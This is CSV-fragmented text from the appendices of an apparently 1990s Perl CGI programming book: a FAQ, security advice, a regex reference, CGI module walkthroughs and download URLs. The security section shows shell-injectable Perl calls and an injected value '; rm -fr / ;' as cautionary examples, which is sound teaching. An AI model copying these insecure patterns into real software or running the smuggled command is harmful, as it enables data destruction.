"Java, the Illusion ",NA,NA
(,NA,NA
http://www.nombas.com/otherdoc/javamagk.htm,NA,NA
),NA,NA
How can I access my environment variables? Why are they ,NA,NA
different sometimes?,NA,NA
You can access the environment variables through the ,NA,NA
%ENV,NA,NA
 associative array. Here is a simple ,NA,NA
script,NA,NA
that dumps out all of the environment variables (sorted):,NA,NA
#!/usr/local/bin/perl ,NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
foreach $key (sort keys %ENV) {,NA,NA
" print $key, "" = "", $ENV{$key}, ""\n""; ",NA,NA
} ,NA,NA
exit (0);,NA,NA
"Why does my output get mangled (like ""if b < a"" is messed up)?",NA,NA
"If you send a MIME content type of HTML, you will have to ""escape"" certain characters, such as ""<,"" ",NA,NA
"""&,"" and "">"", or else the browser will think it is HTML.",NA,NA
You have to escape the characters by using the following construct:,NA,NA
&#ASCII Code; ,NA,NA
Here is a simple script that you can run on the command line that will give you the ASCII code ,NA,NA
for non-alphanumeric characters:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"print ""Please enter a string: ""; ",NA,NA
chop ($string = <STDIN>); ,NA,NA
"$string =~ s/([^\w\s])/sprintf (""&#%d;"", ord ($1))/ge; ",NA,NA
"print ""The escaped string is: $string\n""; ",NA,NA
exit (0); ,NA,NA
"How come when I run it from the command line, my Perl CGI ",NA,NA
"program works, but it doesn't work when I run it from the ",NA,NA
browser?,NA,NA
"This most likely is due to permission problems. Remember, your server is probably running as ",NA,NA
"""nobody,"" ""www,"" or a process with very minimal privileges. As a result, it will not be able to ",NA,NA
execute your script unless it has permission to do so.,NA,NA
How come my Perl CGI program runs fine but doesn't manage ,NA,NA
to write its output files?,NA,NA
"Again, this has to do with permissions! The server cannot write to a file in a certain directory if it ",NA,NA
does not have permission to do so.,NA,NA
You should make it a point to check for error status from the ,NA,NA
open,NA,NA
 command:,NA,NA
"print ""Content-type: text/plain\n\n""; ",NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
"open (FILE, "">"" . ""/some/dir/some.file"") || ",NA,NA
"print ""Cannot write to the data file!"";",NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
"How do I make a form that maintains state, or has several ",NA,NA
entry points?,NA,NA
You can use the CGI::MiniSvrmodule (,NA,NA
http://www-genome.wi.mit.edu/ftp/pub/,NA,NA
software/WWW/CGIperl/docs/MiniSvr.pm.html,NA,NA
) to keep state between multiple entry points.,NA,NA
Or you can create a series of dynamic documents that pass a unique session identification (either as ,NA,NA
"a query, an extra path name, or as a hidden field) to each other.",NA,NA
How do I debug my Perl CGI program without running it from a ,NA,NA
web browser?,NA,NA
It's difficult to debug a CGI script. You can emulate a server by setting environment ,NA,NA
variables manually:,NA,NA
"setenv HTTP_USER_AGENT ""Mozilla/2.0b6""       (csh)",NA,NA
or,NA,NA
"export HTTP_USER_AGENT = ""Mozilla/2.0b6""     (ksh, bash)",NA,NA
You can emulate a POST request by placing the data in a file and piping it to your program:,NA,NA
cat data.file | some_program.pl ,NA,NA
"Or, you can use CGI Lint, which will automate some of this. It will also check for potential ",NA,NA
"security problems, errors in ",NA,NA
"open ( ),",NA,NA
 and invalid HTTP headers.,NA,NA
How can I call a Perl CGI program without using a ,NA,NA
<FORM>,NA,NA
 tag?,NA,NA
You can call a CGI program by simply opening the URL to it:,NA,NA
http://some.machine/cgi-bin/your_program.pl ,NA,NA
"You can also have a link in a document, such as:",NA,NA
"<A HREF=""http://some.machine/cgi-bin/your_program.pl""> ",NA,NA
Click here to access my CGI program</A>,NA,NA
How do I stop people from calling my form without filling ,NA,NA
out anything? Why do they keep doing this?,NA,NA
"Why people do this, I don't know. But, you can check the information from all the fields and return a ",NA,NA
"""No Response"" if any of them are empty. Here is an example (assume the associative array ",NA,NA
$in ,NA,NA
contains your form information):,NA,NA
$error = 0; ,NA,NA
foreach $value (values %in) {,NA,NA
 $value =~ s/\s//g;,NA,NA
 $error = 1 unless ($value); ,NA,NA
} ,NA,NA
if ($error) {,NA,NA
" print ""Content-type: text/plain\n"";",NA,NA
" print ""Status: 204 No Response\n\n"";",NA,NA
" print ""You should only see this message if your browser does"";",NA,NA
" print ""not support the status code 204\n""; ",NA,NA
} else {,NA,NA
 #,NA,NA
 # Process Data Here,NA,NA
 # ,NA,NA
},NA,NA
What are all the server response codes ,NA,NA
(,NA,NA
http://www.w3.org/hypertext/WWW/Protocols/HTTP/HTRESP.html,NA,NA
) ,NA,NA
and what do they mean?,NA,NA
"A CGI program can send specific response codes to the server, which in turn will send them to ",NA,NA
"the browser. For example, if you want a ""No Response"" (meaning that the browser will not load a ",NA,NA
"new page), you need to send a response code of 204 (see the answer to the last question).",NA,NA
Why doesn't ,NA,NA
"print ""Location: http://host/page.html\n"" ",NA,NA
work? Why does it only work the first time and get the redirects ,NA,NA
wrong later?,NA,NA
A CGI program can only send ,NA,NA
one,NA,NA
 Location header. You also cannot send a MIME content type if ,NA,NA
"you want the server to perform redirection. For example, this is not valid, though it may work with ",NA,NA
some servers:,NA,NA
#!/usr/local/bin/perl ,NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
"print ""Content-type: text/plain\n"" ",NA,NA
"print ""Location: ",NA,NA
"http://some.machine/some.doc\n\n"""";",NA,NA
How can I automatically include a:,NA,NA
"""Last updated: ..."" ",NA,NA
line at the bottom of all my HTML pages? Or can I only do that for SSI pages? How do I get the ,NA,NA
date of the CGI script?,NA,NA
"If you are dynamically creating documents using CGI, you can insert a time stamp pretty easily. Here",NA,NA
is an example in Perl 5: ,NA,NA
$last_updated = localtime (time); ,NA,NA
"print ""Last updated: $last_updated\n""; ",NA,NA
or in Perl 4: ,NA,NA
"require ""ctime.pl""; ",NA,NA
$last_updated = &cmtime (time); ,NA,NA
"print ""Last updated: $last_updated\n""; ",NA,NA
or even: ,NA,NA
$date = `/usr/local/bin/date`; ,NA,NA
"print ""Last updated: $last_updated\n""; ",NA,NA
You can accomplish this with SSI like this: ,NA,NA
"<--#echo var=""LAST_MODIFIED""--> ",NA,NA
When is a Perl CGI program too complex for a simple task and ,NA,NA
only a shell will do? When is it not powerful enough for a hard ,NA,NA
one? Isn't C++ much better for this kind of thing? What about C?,NA,NA
Each language has its own advantages and disadvantages. I'm sure you've heard this many times: ,NA,NA
It depends on what you're trying to do. If you are writing a CGI program that's going to be ,NA,NA
"accessed thousands of times in an hour, then you should write it in C or C++. If you are looking ",NA,NA
"for a quick solution (as far as implementation), then Perl is the way to go!",NA,NA
"You should generally avoid the shell for any type of CGI programming, just because of the ",NA,NA
potential for security problems.,NA,NA
CGI and the WWW Server,NA,NA
Security,NA,NA
A.5 Security,NA,NA
Is a Perl CGI program more or less secure than a shell or C one?,NA,NA
The answer to this is: A CGI program is prone to security problems no matter what language it is written ,NA,NA
in!,NA,NA
What particular security concerns should I be aware of?,NA,NA
Never,NA,NA
 expose any form of data to the shell. All of the following are possible security holes:,NA,NA
"open (COMMAND, ""/usr/ucb/finger $form_user""); ",NA,NA
"system (""/usr/ucb/finger $form_user""); ",NA,NA
@data = `usr/ucb/finger $form_user`;,NA,NA
See more examples in the following answers. You should also look at:,NA,NA
WWW Security FAQ (by Lincoln Stein) ,NA,NA
(,NA,NA
http://www-genome.wi.mit.edu/WWW/faqs/www-security-faq.html,NA,NA
),NA,NA
CGI Security FAQ (by Paul Phillips) (,NA,NA
http://www.cerf.net/~paulp/cgisecurity/safe-cgi.txt,NA,NA
),NA,NA
How can I call a program with backtics securely? Is it true that:,NA,NA
@ans = `grep '$user_field' some.file`; ,NA,NA
is insecure?,NA,NA
Yes!,NA,NA
 It's very dangerous! Imagine if ,NA,NA
$user_field,NA,NA
 contains:,NA,NA
; rm -fr / ; ,NA,NA
An equivalent to the above command is:,NA,NA
"if (open (GREP, ""-|"")) {",NA,NA
 @ans = <GREP> ,NA,NA
} else {,NA,NA
" exec (""/usr/local/bin/grep"", $user_field, ""some.file"")",NA,NA
" || die ""Error exec'ing command"", ""\n"";",NA,NA
} ,NA,NA
close (GREP);,NA,NA
Is it true that /$user_variable/ is a security hole in Perl 5?,NA,NA
No! It's not. It's a security hole if you evaluate the expression at runtime using the ,NA,NA
eval,NA,NA
 command. ,NA,NA
Something like this is dangerous:,NA,NA
foreach $regexp (@all_regexps) {,NA,NA
" eval ""foreach (\@data) { push (\@matches, \$_) if m|$regexp|o; }""; } ",NA,NA
Specific Programming,NA,NA
Questions,NA,NA
--Shishir Gundavaram ,NA,NA
(A big thanks to Perl guru Tom Christiansen for coming up with some of the most frequently asked ,NA,NA
questions.),NA,NA
Security,NA,NA
Summary of Regular,NA,NA
Expressions,NA,NA
B. Summary of Regular Expressions,NA,NA
One of the most powerful features of Perl is its regular expression handling. Regular expressions are ,NA,NA
"especially useful for CGI programming, as text manipulation is central to so many CGI applications. ",NA,NA
"In this appendix, we include a quick reference to regular expressions in Perl. For more information on ",NA,NA
"Perl, see the Nutshell Handbooks ",NA,NA
Learning Perl ,NA,NA
"by Randal L. Schwartz, ",NA,NA
Programming Perl ,NA,NA
by Larry ,NA,NA
"Wall and Randal L. Schwartz, and ",NA,NA
Perl 5 Desktop Reference,NA,NA
" by Johan Vromans, all published by ",NA,NA
"O'Reilly & Associates, Inc.",NA,NA
/abc/,NA,NA
Matches ,NA,NA
abc,NA,NA
 anywhere within the string,NA,NA
/^abc/,NA,NA
Matches ,NA,NA
abc,NA,NA
 at the beginning of the string,NA,NA
/abc$/,NA,NA
Matches ,NA,NA
abc,NA,NA
 at the end of the string,NA,NA
/a|b/,NA,NA
Matches either ,NA,NA
a,NA,NA
 or ,NA,NA
b,NA,NA
" Can also be used with words (i.e., /",NA,NA
perl|tcl,NA,NA
/),NA,NA
"/ab{2,4}c/",NA,NA
Matches an ,NA,NA
a,NA,NA
 followed by ,NA,NA
2-4 b,NA,NA
"'s, followed by ",NA,NA
c,NA,NA
". If the second number is omitted, such as /",NA,NA
ab ,NA,NA
"{2,}",NA,NA
c,NA,NA
"/, the expression will match two or more ",NA,NA
b,NA,NA
's.,NA,NA
/ab*c/,NA,NA
Matches an ,NA,NA
a,NA,NA
 followed by zero or more ,NA,NA
b,NA,NA
"'s, followed by ",NA,NA
c,NA,NA
. Expressions are greedy--it will ,NA,NA
match as many as possible. Same as /,NA,NA
ab,NA,NA
"{0,}",NA,NA
c,NA,NA
/.,NA,NA
/ab+c/,NA,NA
Matches an ,NA,NA
a,NA,NA
 followed by one or more ,NA,NA
b,NA,NA
's followed by ,NA,NA
c,NA,NA
. Same as /,NA,NA
ab,NA,NA
"{1,}",NA,NA
c,NA,NA
/.,NA,NA
/ab?c/,NA,NA
Matches an ,NA,NA
a,NA,NA
 followed by an optional ,NA,NA
b,NA,NA
 followed by c Same as /,NA,NA
ab,NA,NA
"{0,1}",NA,NA
c,NA,NA
/. This has a different ,NA,NA
"meaning in Perl 5. In Perl 5, the expression: /ab*?c/matches an ",NA,NA
a,NA,NA
 followed by as few ,NA,NA
b,NA,NA
's as ,NA,NA
possible (non-greedy).,NA,NA
/./,NA,NA
Matches any single character except a newline (\n) /,NA,NA
p..l,NA,NA
 / matches a p followed by any two,NA,NA
"characters, followed by l, so it will match such strings as perl, pall, pdgl, p3gl, etc. ",NA,NA
/[abc]/,NA,NA
A character class--matches any one of the three characters listed. A pattern of /[abc]+/ matches ,NA,NA
"strings such as abcab, acbc, abbac, aaa, abcacbac, ccc, etc.",NA,NA
/\d/,NA,NA
Matches a digit. Same as /[0-9]/Multipliers can be used (/\d+/ matches one or more digits) ,NA,NA
/\w/,NA,NA
Matches a character classified as a word. Same as /[a-zA-Z0-9_]/ ,NA,NA
/\s/,NA,NA
Matches a character classified as whitespace. Same as /[ \r\t\n\f]/ ,NA,NA
/\b/,NA,NA
"Matches a word boundary or a backspace/test\b/ matches test, but not testing. However, \b ",NA,NA
"matches a backspace character inside a class (i.e., [\b]) ",NA,NA
/[^abc]/,NA,NA
"Matches a character that is not in the class/[^abc ]+/ will match such strings as hello, test, perl, ",NA,NA
etc.,NA,NA
/\D/,NA,NA
Matches a character that is not a digit. Same as /[^0-9]/ ,NA,NA
/\W/,NA,NA
Matches a character that is not a word. Same as /[^a-zA-Z0-9_]/ ,NA,NA
/\S/,NA,NA
Matches a character that is not whitespace. Same as /[^ \r\t\n\f]/ ,NA,NA
/\B/,NA,NA
"Requires that there is no word boundary/hello\B/ matches hello, but not hello there ",NA,NA
/\*/,NA,NA
Matches the * character. Use the \ character to escape characters that have significance in a ,NA,NA
regular expression.,NA,NA
/(abc)/,NA,NA
Matches ,NA,NA
abc,NA,NA
" anywhere within the string, but the parentheses act as memory, storing ",NA,NA
abc,NA,NA
 in the ,NA,NA
variable $1.,NA,NA
Example 1:,NA,NA
/name=(.*)/ will store zero or more characters after name= in variable $1. ,NA,NA
Example 2:,NA,NA
"/name=(.*)&user=\1/ will store zero or more characters after name= in $1. Then, Perl ",NA,NA
"will replace \1 with the value in $1, and check to see if the pattern matches.",NA,NA
Example 3:,NA,NA
/name=([^&]*)/ will store zero or more characters after name= but before the & character ,NA,NA
in variable $1.,NA,NA
Example 4:,NA,NA
/name=([^&]+)&age=(.*)$/ will store one or more characters after name= but before & in ,NA,NA
$1. It then matches the & character. All characters after age= but before the end of the ,NA,NA
line are stored in $2.,NA,NA
/abc/i,NA,NA
"Ignores case. Matches either abc, Abc, ABC, aBc, aBC, etc.",NA,NA
CGI Modules for Perl 5,NA,NA
C. CGI Modules for Perl 5,NA,NA
Contents: ,NA,NA
Overview of Modules ,NA,NA
Form Creation and Parsing,NA,NA
"If you are tired of writing code to create forms, decoding form information, or maintaining state ",NA,NA
"between multiple forms, you can make your life easier by using the freely available CGI modules for ",NA,NA
"Perl 5. However, unless you are familiar with programming, it will be difficult to fully grasp how ",NA,NA
these modules work internally.,NA,NA
C.1 Overview of Modules,NA,NA
"First, here is a list of the available modules. We will look at an example that incorporates the ",NA,NA
functionality from some of these modules shortly.,NA,NA
Base.pm,NA,NA
"This is the core module that contains common methods (i.e., functions) that some of the other classes ",NA,NA
depend on. These include methods to read form information (the module does not parse or decode the ,NA,NA
"data), log debug messages, implement socket I/O for maintaining state, and access and manipulate ",NA,NA
"data from environment variables, such as the client's acceptable MIME content types.",NA,NA
"If you are familiar with object-oriented programming, ",NA,NA
Base.pm,NA,NA
" represents the base class, from which ",NA,NA
"other classes ""inherit"" methods and data structures. The ""child"" classes can override the methods from ",NA,NA
"the base class to create modified functions, or implement new ones.",NA,NA
BasePlus.pm,NA,NA
"This module consists of functions to handle the new multipart forms generated by ""file upload""--a ",NA,NA
feature new to Netscape 2.0. The file upload feature allows users to send files on their local machines ,NA,NA
"as part of a form. This is a very powerful feature, but decoding the data can be a hassle. So, you ",NA,NA
should use either this module or the ,NA,NA
CGI_Lite,NA,NA
 module to handle multipart forms.,NA,NA
Request.pm,NA,NA
You can parse and decode form and query data with this module. That's all there is to it!,NA,NA
Form.pm,NA,NA
Have you ever wished you could create forms much more quickly and easily than outputting a series ,NA,NA
"of HTML tags? If so, the Form module is the one for you! You no longer have to remember how to ",NA,NA
create a radio button or a scrolled down list.,NA,NA
"In addition, this module allows you to easily decode and parse form and query data. The functions ",NA,NA
responsible for this are inherited from the ,NA,NA
Base.pm,NA,NA
 and ,NA,NA
Request.pm,NA,NA
 modules.,NA,NA
MiniSvr.pm,NA,NA
"With this module, you can implement a ""mini HTTP daemon"" which can be forked from a CGI ",NA,NA
application to maintain state between multiple form invocations. The daemon sits on a port with a ,NA,NA
"relatively short timeout, waiting for a request. It then serves the request and terminates. Now, imagine ",NA,NA
"what will happen to your host machine if the rate of process creation (i.e., forking) exceeds that of ",NA,NA
termination.,NA,NA
"You need to be careful when using this module to maintain state, as it creates multiple processes to ",NA,NA
"handle requests. If the rate of process creation exceeds that of termination, your server will become ",NA,NA
overloaded and may result in serious problems.,NA,NA
"However, this module can be very helpful if used correctly, as all socket I/O is handled by the module ",NA,NA
"so that you don't have to worry about such things as choosing the correct port number, establishing the ",NA,NA
"socket, or reading from the socket.",NA,NA
Response.pm,NA,NA
"Though not a part of the official CGI module distribution at the time of this writing, this module ",NA,NA
"contains functions that make it easier to output HTML headers. For example, if you don't want a ",NA,NA
"document to be cached, you can call a method that will automatically output the ",NA,NA
Pragma,NA,NA
 and ,NA,NA
Expires ,NA,NA
headers for you.,NA,NA
Carp.pm,NA,NA
"This module is independent, in that it does not inherit any functionality from the base class. However, ",NA,NA
it is a very useful module that allows you to format error messages sent to the server log file or ,NA,NA
redirect them to the browser or another file.,NA,NA
Summary of Regular,NA,NA
Expressions,NA,NA
Form Creation and Parsing,NA,NA
C.2 Form Creation and Parsing,"Here is a simple example that creates a form and parses the data using the modules that we've just discussed. The dynamic 
 form that is output by the program is shown in Figure C-1.
  
 Figure C.1: Form created from Perl 5 modules
  
 [Graphic: 
  
 Figure C-1]
  
 Now, let's look at the program:
  
 #!/usr/local/bin/perl5 
  
 use CGI::Form; 
  
 use CGI::Response qw(:Simple); 
  
 use CGI::Carp;
  
 Before we can use any of the methods in the CGI modules, we have to import them into our program. In the case of 
 CGI::Response
 , some of the ""simple"" methods, such as those that output the 
 Content-type
  and 
 Pragma
  HTTP headers, are not 
 exported by the module so we have to literally specify it.
  
 print NoCache ();
  
 The 
 NoCache
  method from the 
 CGI::Response
  class outputs the following header information:
  
 Pragma: no-cache 
  
 Content-Type: text/html 
  
 Expires: Mon, 29 Jan 1996 00:53:49 GMT
  
 which instructs the server that HTML data is about to follow, and that it should not cache the document.
  
 $cgi_form = new CGI::Form (); 
  
 $user = $cgi_form->param ('name'); 
  
 We create a new instance of the 
 Form
  object and store it in 
 $cgi_form
 . Then, we retrieve the value for the form field labeled 
 name
  so that we can use it to personalize the title of the document for successive forms.
  
 Here we see an example of inheritance. The 
 param
  method is implemented in the 
 CGI::Request
  module, which is inherited by 
 CGI::Form
 . As a result, we can access the method as though it was part of 
 CGI::Form
 .
  
 if ($user) {
  
  
  $remote_user = ""Welcomes $user""; 
  
 } else {
  
  
  $remote_user = join ("" "", ""- Welcome from"", $cgi_form->cgi->var (""REMOTE_HOST"")); 
 }
  
 Here, we set the 
 $remote_user
  variable to a welcome message. If the 
 $user
  variable is not defined, we use the remote host name 
 instead. Here is another interesting call. The 
 cgi
  method is implemented in the 
 CGI::Request
  module and interfaces with 
 CGI::Base
 . The 
 var
  method is defined in 
 CGI::Base
  and returns the value of a specific environment variable.
  
 print <<Start_HTML;",NA
D. CGI Lite,NA,NA
Contents: ,NA,NA
Multipart Forms,NA,NA
CGI Lite is a Perl 5 library that will decode both URL-encoded and multipart form data produced by the file upload ,NA,NA
"feature present in Netscape 2.0. This module does not have all of the features of the CGI::* modules, but is ",NA,NA
lightweight and slightly easier to use. Here is a simple example that outputs all the form data:,NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use CGI_Lite; ,NA,NA
$cgi = new CGI_Lite (); ,NA,NA
$cgi->parse_form_data ();,NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
$cgi->print_form_data ();,NA,NA
exit (0);,NA,NA
The ,NA,NA
parse_form_data,NA,NA
" method parses the form data and stores it in an internal associative array, which can be printed ",NA,NA
out by calling the ,NA,NA
print_form_data,NA,NA
" method. Or, you can place the form data in a variable of your choice:",NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use CGI_Lite;,NA,NA
$cgi = new CGI_Lite (); ,NA,NA
%data = $cgi->parse_form_data ();,NA,NA
"print ""Content-type: text/plain"", ""\n\n"";",NA,NA
foreach $key (keys %data) {,NA,NA
" print $key, "" = "", $data{$key}, ""\n""; ",NA,NA
},NA,NA
exit (0);,NA,NA
D.1 Multipart Forms,NA,NA
The file upload feature of Netscape 2.0 allows you to do just that: send files as part of a form through the network. ,NA,NA
Here is how to create a multipart form:,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>CGI Lite Test</TITLE></HEAD> ,NA,NA
<BODY>,NA,NA
<H1>CGI Lite Test</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/upload.pl"" ENCTYPE=""multipart/form-data"" METHOD=""POST""> ",NA,NA
"What is your name? <INPUT TYPE=""text"" NAME=""username""> ",NA,NA
<P> ,NA,NA
"Select a <B>TEXT</B> file to send: <INPUT TYPE=""file"" NAME=""input_file""> <P> ",NA,NA
"<INPUT TYPE=""submit"" VALUE=""Send the Multipart Form""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear the Information""> ",NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
</BODY> ,NA,NA
</HTML>,NA,NA
There are two things that are very different from what we have seen before. The first is the ENCTYPE attribute in ,NA,NA
"the FORM tag. If we want the form data to be URL-encoded, then we don't have to specify ENCTYPE, in which ",NA,NA
case it defaults to ,NA,NA
application/x-www-form-urlencoded,NA,NA
.,NA,NA
"The other is the TYPE attribute in the INPUT tag. By specifying a TYPE of ""file"", Netscape will display a ""Browse"" ",NA,NA
button which allows you to select a file from your disk or network.,NA,NA
Figure D.1,NA,NA
 shows how the form will be rendered by Netscape.,NA,NA
Figure D.1: Snapshot of multipart form,NA,NA
The following program decodes the form information and sends the user-uploaded file back to the browser for ,NA,NA
display. (That's the reason why we asked the user to send text files.),NA,NA
#!/usr/local/bin/perl5 ,NA,NA
use CGI_Lite;,NA,NA
$cgi = new CGI_Lite ();,NA,NA
"print ""Content-type: text/plain"", ""\n\n""; ",NA,NA
"$cgi->set_directory (""/usr/shishir"") || die ""Directory doesn't exist.\n"";",NA,NA
The ,NA,NA
set_directory,NA,NA
" method allows you to store the uploaded files in a specific directory. If this method is not called, ",NA,NA
CGI_Lite defaults to ,NA,NA
/tmp,NA,NA
.,NA,NA
"$cgi->set_platform (""UNIX"");",NA,NA
"Since this is a text file, we can use the ",NA,NA
set_platform,NA,NA
 method to add or remove the appropriate end of line (EOL) ,NA,NA
"characters. The EOL character is a linefeed (""\n"") in UNIX, a carriage return (""\r"") on the Macintosh, and a ",NA,NA
"combination of carriage return and line feed (""\r\n"") on the Windows/DOS platform.",NA,NA
"$cgi->set_file_type (""handle""); ",NA,NA
%data = $cgi->parse_form_data ();,NA,NA
The ,NA,NA
set_file_type,NA,NA
" method with an argument of ""handle"" returns the filehandle(s) for uploaded files that are stored in ",NA,NA
the directory specified by the ,NA,NA
set_directory,NA,NA
 method.,NA,NA
$user = $data{'username'}; ,NA,NA
$filename = $data{'input'}; ,NA,NA
"print ""Welcome $user, let's see what file you uploaded..."", ""\n""; ",NA,NA
"print ""="" x 80, ""\n"";",NA,NA
"Here we simply retrieve the form fields and display a welcome message. Remember, the variable ",NA,NA
$filename,NA,NA
 points to ,NA,NA
a filehandle.,NA,NA
if (-T $filename) {,NA,NA
 while (<$filename>) {,NA,NA
 print;,NA,NA
 } ,NA,NA
 close ($filename); ,NA,NA
} else {,NA,NA
" print ""Sorry! you did not upload a text file."", ""\n""; ",NA,NA
} ,NA,NA
exit (0);,NA,NA
"If the uploaded file is a text file, we proceed to output it. If not, an error message is output.",NA,NA
Form Creation and Parsing,NA,NA
"Applications, Modules,",NA,NA
"Utilities, and Documentation",NA,NA
"E. Applications, Modules, Utilities, and ",NA,NA
Documentation,NA,NA
Contents: ,NA,NA
Software Developed for the Book ,NA,NA
CGI Software ,NA,NA
Utilities and Applications ,NA,NA
WWW Server Information ,NA,NA
Online Documentation ,NA,NA
Official Specifications,NA,NA
"Throughout this book, we refer to free (or nearly free) programs and utilities that are used for CGI ",NA,NA
"development. In this appendix, we list URLs from which these utilities can be downloaded.",NA,NA
E.1 Software Developed for the Book,NA,NA
"CGI Lint, CGI Lite, and Sprite are available at the various CPAN (Comprehensive Perl Archive ",NA,NA
Network) mirrors throughout the world. Here is a list of the CPAN mirrors:,NA,NA
ftp://ftp.funet.fi/pub/languages/perl/CPAN/ ,NA,NA
ftp://ftp.cis.ufl.edu/pub/perl/CPAN/ ,NA,NA
ftp://uiarchive.cso.uiuc.edu/pub/lang/perl/CPAN/ ,NA,NA
ftp://ftp.delphi.com/pub/mirrors/packages/perl/CPAN ,NA,NA
ftp://ftp.uoknor.edu/mirrors/CPAN/ ,NA,NA
ftp://ftp.sedl.org/pub/mirrors/CPAN/ ,NA,NA
"ftp://ftp.ibp.fr/pub/perl/CPAN/"" ",NA,NA
ftp://ftp.pasteur.fr/pub/computing/unix/perl/CPAN/ ,NA,NA
ftp://ftp.leo.org/pub/comp/programming/languages/perl/CPAN/ ,NA,NA
ftp://ftp.rz.ruhr-uni-bochum.de/pub/programming/languages/perl/CPAN/ ,NA,NA
ftp://ftp.demon.co.uk/pub/mirrors/perl/CPAN/ ,NA,NA
ftp://ftp.cs.ruu.nl/pub/PERL/CPAN/ ,NA,NA
ftp://ftp.sunet.se/pub/lang/perl/CPAN/ ,NA,NA
ftp://ftp.switch.ch/mirror/CPAN/ ,NA,NA
ftp://ftp.mame.mu.oz.au/pub/perl/CPAN/,NA,NA
ftp://ftp.tekotago.ac.nz/pub/perl/CPAN/ ,NA,NA
ftp://ftp.lab.kdd.co.jp/lang/perl/CPAN/ ,NA,NA
ftp://dongpo.math.ncu.edu.tw/perl/CPAN/ ,NA,NA
ftp://ftp.is.co.za/programming/perl/CPAN/,NA,NA
The applications are located in the following directory (within CPAN):,NA,NA
/modules/by-authors/Shishir_Gundavaram,NA,NA
"Examples shown in this book can be downloaded from the O'Reilly & Associates, Inc. FTP site:",NA,NA
ftp://ftp.ora.com/published/oreilly/nutshell/cgi,NA,NA
Multipart Forms,NA,NA
CGI Software,NA,NA
E.2 CGI Software,NA,NA
cgic - CGI C/C++ Library ,NA,NA
cgi-lib.pl ,NA,NA
CGI::* Modules ,NA,NA
EIT's CGI Library for ,NA,NA
C/C++ ,NA,NA
Grant's CGI Framework for ,NA,NA
the Macintosh ,NA,NA
libwww ,NA,NA
Python CGI Library ,NA,NA
uncgi,NA,NA
http://www.boutell.com/cgic/ ,NA,NA
http://www.bio.cam.ac.uk/web/form.html ,NA,NA
http://www-genome.wi.mit.edu/WWW/tools/scripting/CGIperl,NA,NA
http://wsk.eit.com/wsk/dist/doc/libcgi/libcgi.html,NA,NA
http://arpp1.carleton.ca/grant/mac/grantscgi.html,NA,NA
/CPAN/modules/by-authors/Gisle_Aas,NA,NA
 in the CPAN ,NA,NA
archives ,NA,NA
http://www.python.org/~mclay/notes/cgi.html ,NA,NA
http://www.hyperion.com/~koreth/uncgi.html,NA,NA
Software Developed for the,NA,NA
Book,NA,NA
Utilities and Applications,NA,NA
E.3 Utilities and Applications,NA,NA
DBI/DBperl ,NA,NA
fakessi.pl,NA,NA
GD Graphics ,NA,NA
Library,NA,NA
GhostScript ,NA,NA
Glimpse ,NA,NA
gnuplot v3.5 ,NA,NA
ImageMagick ,NA,NA
mSQL ,NA,NA
netpbm ,NA,NA
oraperl ,NA,NA
pgperl ,NA,NA
Python ,NA,NA
RDB ,NA,NA
SWISH ,NA,NA
sybperl,NA,NA
/authors/Tim_Bunce/DBI,NA,NA
 in the CPAN archives ,NA,NA
http://sw.cse.bris.ac.uk/WebTools/fakessi.html ,NA,NA
C Library:(,NA,NA
http://www.boutell.com/gd/,NA,NA
) Perl ,NA,NA
5.0:,NA,NA
http://www-genome.wi.mit.edu/ftp/pub/software/WWW/GD.html ,NA,NA
Tcl:,NA,NA
http://guraldi.hgp.med.umich.edu/gdtcl.html ,NA,NA
http://www.phys.ufl.edu/docs/goodies/unix/previewers/ghostscript.html ,NA,NA
http://glimpse.cs.arizona.edu ,NA,NA
ftp://prep.ai.mit.edu/pub/gnu/gnuplot-3.5.tar.gz ,NA,NA
ftp://ftp.x.org/contrib/applications/ImageMagick/ ,NA,NA
http://bond.edu.au/People/bambi/mSQL/ ,NA,NA
ftp://ftp.x.org/R5contrib/netpbm-1mar1994.tar.gz ,NA,NA
http://src.doc.ic.ac.uk/packages/perl/db/perl4/oraperl ,NA,NA
http://www.ast.cam.ac.uk/~kgb/pgperl.html ,NA,NA
http://www.python.org ,NA,NA
http://www.metronet.com/perlinfo/scripts/dbase/RDB.tar.Z ,NA,NA
http://www.eit.com/software/swish/swish.html,NA,NA
http://src.doc.ic.ac.uk/packages/perl/db/perl4/sybperl,NA,NA
CGI Software,NA,NA
WWW Server Information,NA,NA
E.4 WWW Server Information,NA,NA
NCSA httpd ,NA,NA
http://hoohoo.ncsa.uiuc.edu/docs/Overview.html,NA,NA
CERN Server ,NA,NA
http://www.w3.org/hypertext/WWW/Daemon/Status.html,NA,NA
Apache Server ,NA,NA
http://www.apache.org,NA,NA
Netscape Communications Server ,NA,NA
and Netscape Commerce Server,NA,NA
http://home.netscape.com/,NA,NA
WebSTAR Server ,NA,NA
http://www.biap.com/,NA,NA
Win httpd ,NA,NA
http://www.city.net/win-httpd/,NA,NA
HTTPS ,NA,NA
http://emwac.ed.ac.uk/html/internet_toolchest/https/contents.htm,NA,NA
WebSite ,NA,NA
http://website.ora.com,NA,NA
Utilities and Applications,NA,NA
Online Documentation,NA,NA
E.5 Online Documentation,NA,NA
AppleScript Guide to CGI ,NA,NA
Scripts,NA,NA
CGI FAQ,NA,NA
CGI Security FAQ ,NA,NA
Perl Reference Guide ,NA,NA
Perl FAQ ,NA,NA
SQL-92 ,NA,NA
WWW FAQ ,NA,NA
WWW Security FAQ,NA,NA
http://152.1.24.177/teaching/manuscript/default.html,NA,NA
http://perl.com ,NA,NA
ftp://ftp.ora.com/published/oreilly/nutshell/cgi ,NA,NA
http://www.cerf.net/~paulp/cgi-security/safe-cgi.txt,NA,NA
/doc/refguide in the CPAN archives ,NA,NA
/doc/FAQ in the CPAN archives ,NA,NA
http://sunsite.doc.ic.ac.uk/packages/perl/db/refinfo/sql2/sql1992.txt ,NA,NA
http://www.boutell.com/faq ,NA,NA
